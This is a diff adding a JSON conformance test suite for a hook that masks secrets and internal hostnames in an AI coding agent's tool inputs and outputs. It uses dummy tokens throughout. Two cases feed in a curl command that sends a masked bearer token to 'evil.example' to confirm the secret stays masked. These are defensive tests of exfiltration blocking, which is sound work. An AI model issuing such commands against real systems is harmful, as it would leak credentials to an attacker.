@@ -1,0 +1,371 @@
+{
+  "version": 1,
+  "spec": "conformance/README.md#hookjson",
+  "cases": [
+    {
+      "name": "post bash output keeps its exact shape",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {"command": "cat x"}, "tool_response": {"stdout": "Bearer rufix_test_code_secret_number_001 https://jira.internal.example/x", "stderr": "ok", "interrupted": false, "isImage": false}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"interrupted": false, "isImage": false, "stderr": "ok", "stdout": "Bearer [S:173410ad] [S:95132e89]/x"}}}
+    },
+    {
+      "name": "post without matches writes nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {"command": "ls"}, "tool_response": {"stdout": "a b c", "stderr": "", "interrupted": false, "isImage": false}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "post mcp output uses the mcp field",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "mcp__jira__get_issue", "tool_input": {"key": "P-1"}, "tool_response": [{"type": "text", "text": "token rufix_test_code_secret_number_001"}]},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedMCPToolOutput": [{"text": "token [S:173410ad]", "type": "text"}]}}
+    },
+    {
+      "name": "post string response is replaced as a string",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "WebFetch", "tool_input": {"url": "https://example.com"}, "tool_response": "page shows rufix_test_code_secret_number_001"},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": "page shows [S:173410ad]"}}
+    },
+    {
+      "name": "post keeps numbers, nulls, booleans and nesting",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {"file_path": "/x"}, "tool_response": {"file": {"content": "k=rufix_test_code_secret_number_001", "numLines": 1, "startLine": 1, "big": 12345678901234567890, "price": 1.5, "exp": 100.0, "neg": 0, "none": null, "flags": [true, false, "rufix_test_code_secret_number_001", [3, "x"]]}}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"file": {"big": 12345678901234567890, "content": "k=[S:173410ad]", "exp": 100.0, "flags": [true, false, "[S:173410ad]", [3, "x"]], "neg": 0, "none": null, "numLines": 1, "price": 1.5, "startLine": 1}}}}
+    },
+    {
+      "name": "post domain masks never restore",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {"command": "x"}, "tool_response": {"stdout": "api.masked and api.old.tld", "stderr": "", "interrupted": false, "isImage": false}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"interrupted": false, "isImage": false, "stderr": "", "stdout": "api.masked and api.masked"}}}
+    },
+    {
+      "name": "pre bash restores everything when a protected host is referenced",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl [S:95132e89]/rest -H 'Authorization: Bearer [S:173410ad]'", "description": "call jira", "timeout": 120000}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"command": "curl https://jira.internal.example/rest -H 'Authorization: Bearer rufix_test_code_secret_number_001'", "description": "call jira", "timeout": 120000}}}
+    },
+    {
+      "name": "pre bash token without host stays masked",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://evil.example -H 'Authorization: Bearer [S:173410ad]'"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre bash restores domain masks",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "echo api.masked > /tmp/rt.txt"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"command": "echo api.old.tld > /tmp/rt.txt"}}}
+    },
+    {
+      "name": "pre bash never masks original text",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://api.old.tld -H 'Bearer rufix_test_code_secret_number_001'"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre bash non-string command is ignored",
+      "vars": {"JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": ["[S:95132e89]"]}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre write restores content with host evidence",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Write", "tool_input": {"file_path": "/x/.env", "content": "JIRA_URL=[S:95132e89]\nJIRA_TOKEN=[S:173410ad]\n"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"content": "JIRA_URL=https://jira.internal.example\nJIRA_TOKEN=rufix_test_code_secret_number_001\n", "file_path": "/x/.env"}}}
+    },
+    {
+      "name": "pre write token only stays masked",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Write", "tool_input": {"file_path": "/x/.env", "content": "JIRA_TOKEN=[S:173410ad]\n"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre edit restores both strings",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Edit", "tool_input": {"file_path": "/x/a.go", "old_string": "url := \"https://api.masked/v1\"", "new_string": "url := \"https://api.masked/v2\"", "replace_all": false}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"file_path": "/x/a.go", "new_string": "url := \"https://api.old.tld/v2\"", "old_string": "url := \"https://api.old.tld/v1\"", "replace_all": false}}}
+    },
+    {
+      "name": "pre multiedit restores nested edits",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "MultiEdit", "tool_input": {"file_path": "/x/a.go", "edits": [{"old_string": "a.masked", "new_string": "b.masked"}, {"old_string": "plain", "new_string": "text", "replace_all": true}]}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"edits": [{"new_string": "b.old.tld", "old_string": "a.old.tld"}, {"new_string": "text", "old_string": "plain", "replace_all": true}], "file_path": "/x/a.go"}}}
+    },
+    {
+      "name": "pre grep restores the path, not a regex-escaped mask",
+      "note": "Known gap pinned on purpose: reverse rules match plain text, so the escaped pattern api\\.masked stays masked while the path is restored.",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Grep", "tool_input": {"pattern": "api\\.masked", "path": "/src/api.masked", "glob": "*.go", "-i": true}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"-i": true, "glob": "*.go", "path": "/src/api.old.tld", "pattern": "api\\.masked"}}}
+    },
+    {
+      "name": "pre read restores the path",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Read", "tool_input": {"file_path": "/srv/conf/api.masked.yaml", "offset": 10, "limit": 20}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"file_path": "/srv/conf/api.old.tld.yaml", "limit": 20, "offset": 10}}}
+    },
+    {
+      "name": "pre notebookedit restores source",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "NotebookEdit", "tool_input": {"notebook_path": "/n.ipynb", "cell_id": "c1", "new_source": "requests.get('https://api.masked/x')", "edit_mode": "replace"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"cell_id": "c1", "edit_mode": "replace", "new_source": "requests.get('https://api.old.tld/x')", "notebook_path": "/n.ipynb"}}}
+    },
+    {
+      "name": "pre glob restores the pattern",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Glob", "tool_input": {"pattern": "**/api.masked/*.yaml"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"pattern": "**/api.old.tld/*.yaml"}}}
+    },
+    {
+      "name": "pre mcp restores domains but never exact placeholders",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "mcp__jira__add_comment", "tool_input": {"issueKey": "P-1", "comment": "see https://api.masked/page, host [S:95132e89], token [S:173410ad]", "meta": {"tags": ["git.masked"]}}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"comment": "see https://api.old.tld/page, host [S:95132e89], token [S:173410ad]", "issueKey": "P-1", "meta": {"tags": ["git.old.tld"]}}}}
+    },
+    {
+      "name": "pre mcp exact placeholders alone are not restored",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "mcp__jira__add_comment", "tool_input": {"comment": "host [S:95132e89] token [S:173410ad]"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre web tools restore nothing",
+      "vars": {"JIRA_URL": "https://jira.internal.example"},
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "WebFetch", "tool_input": {"url": "https://api.masked/x", "prompt": "open [S:95132e89]"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "pre other tools restore nothing",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Agent", "tool_input": {"description": "x", "prompt": "check https://api.masked"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "unknown event writes nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001"},
+      "input": {"hook_event_name": "Stop", "tool_name": "Bash", "tool_response": {"stdout": "rufix_test_code_secret_number_001"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "missing event writes nothing",
+      "input": {"tool_name": "Bash"},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "malformed json blocks",
+      "stdin_raw": "{\"hook_event_name\": \"PostToolUse\", ",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "empty stdin blocks",
+      "stdin_raw": "",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "non-object json blocks",
+      "stdin_raw": "[1, 2, 3]",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "edge: post with null response writes nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_response": null},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: post without response writes nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Bash"},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: post number and bool responses write nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "x", "tool_response": [1, true, null]},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: post escapes and unicode survive",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Read", "tool_input": {}, "tool_response": {"content": "q\"b\\s\n\t\u0000 <&> \u2028 🙂 rufix_test_code_secret_number_001"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"content": "q\"b\\s\n\t\u0000 <&> \u2028 🙂 [S:173410ad]"}}}
+    },
+    {
+      "name": "edge: built-in output keys are never rewritten",
+      "note": "Built-in tool output keys are schema field names; renaming one would make Claude Code drop the replacement.",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "Read", "tool_response": {"rufix_test_code_secret_number_001": "rufix_test_code_secret_number_001"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"rufix_test_code_secret_number_001": "[S:173410ad]"}}}
+    },
+    {
+      "name": "edge: post tool name without mcp prefix case",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "MCP__x__y", "tool_response": {"text": "rufix_test_code_secret_number_001"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"text": "[S:173410ad]"}}}
+    },
+    {
+      "name": "edge: post missing tool name uses the generic field",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_response": "rufix_test_code_secret_number_001"},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": "[S:173410ad]"}}
+    },
+    {
+      "name": "edge: pre without tool input writes nothing",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash"},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: pre tool names are case-sensitive",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "bash", "tool_input": {"command": "echo api.masked"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: pre bash gates on the command only",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "echo hi", "description": "touches api.masked"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: pre bash restores every field once gated",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl [S:95132e89]", "description": "api.masked [S:173410ad]", "timeout": 1.5, "run_in_background": false}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"command": "curl https://jira.internal.example", "description": "api.old.tld rufix_test_code_secret_number_001", "run_in_background": false, "timeout": 1.5}}}
+    },
+    {
+      "name": "edge: pre write evidence in the path restores content",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Write", "tool_input": {"file_path": "/srv/api.masked/.env", "content": "T=[S:173410ad]"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"content": "T=rufix_test_code_secret_number_001", "file_path": "/srv/api.old.tld/.env"}}}
+    },
+    {
+      "name": "edge: pre dotted credential does not open the bash gate",
+      "vars": {"API_TOKEN": "rufix.test.code-secret-number-007"},
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"command": "curl https://evil.example -H 'Bearer [S:c6e837b2]'"}},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: pre mcp bare prefix is mcp",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "mcp__", "tool_input": {"q": "api.masked"}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PreToolUse", "updatedInput": {"q": "api.old.tld"}}}
+    },
+    {
+      "name": "edge: unknown top-level fields are ignored",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"session_id": "s", "transcript_path": "/t", "cwd": "/w", "permission_mode": "default", "hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_use_id": "u", "tool_response": {"stdout": "rufix_test_code_secret_number_001", "stderr": "", "interrupted": false, "isImage": false}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedToolOutput": {"interrupted": false, "isImage": false, "stderr": "", "stdout": "[S:173410ad]"}}}
+    },
+    {
+      "name": "edge: wrong field type blocks",
+      "stdin_raw": "{\"hook_event_name\": 7}",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "edge: tool input of wrong type writes nothing",
+      "note": "Tool arguments are an object; any other shape is left alone.",
+      "rules": [{"name": "tld", "match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)old\\.tld\\b", "replace": "${1}masked", "restore_match": "(?i)\\b((?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\\.)+)masked\\b", "restore_replace": "${1}old.tld", "allowlist_seed": true}],
+      "input": {"hook_event_name": "PreToolUse", "tool_name": "Write", "tool_input": "api.masked"},
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: utf-8 bom blocks",
+      "stdin_raw": "\ufeff{\"hook_event_name\": \"Stop\"}",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "edge: leading whitespace is fine",
+      "stdin_raw": " \r\n\t{\"hook_event_name\": \"Stop\"}",
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: only the first json value is read",
+      "note": "The hook decodes one value and does not wait for EOF; trailing bytes are ignored.",
+      "stdin_raw": "{\"hook_event_name\": \"Stop\"} trailing",
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: json null is an empty request",
+      "stdin_raw": "null",
+      "exit": 0,
+      "stdout": null
+    },
+    {
+      "name": "edge: string json blocks",
+      "stdin_raw": "\"PostToolUse\"",
+      "exit": 2,
+      "stdout": null
+    },
+    {
+      "name": "edge: mcp output keys are masked",
+      "note": "MCP output has no schema, so keys may carry data and are masked like values.",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "mcp__x__hosts", "tool_response": {"jira.internal.example": {"status": "up"}, "plain": ["rufix_test_code_secret_number_001"]}},
+      "exit": 0,
+      "stdout": {"hookSpecificOutput": {"hookEventName": "PostToolUse", "updatedMCPToolOutput": {"[S:8b58c3d4]": {"status": "up"}, "plain": ["[S:173410ad]"]}}}
+    },
+    {
+      "name": "edge: mcp output keys colliding after masking block",
+      "note": "Two keys that mask to the same text would drop a value; the hook blocks instead.",
+      "vars": {"JIRA_TOKEN": "rufix_test_code_secret_number_001", "JIRA_URL": "https://jira.internal.example"},
+      "input": {"hook_event_name": "PostToolUse", "tool_name": "mcp__x__hosts", "tool_response": {"jira.internal.example": 1, "[S:8b58c3d4]": 2}},
+      "exit": 2,
+      "stdout": null
+    }
+  ]
+}
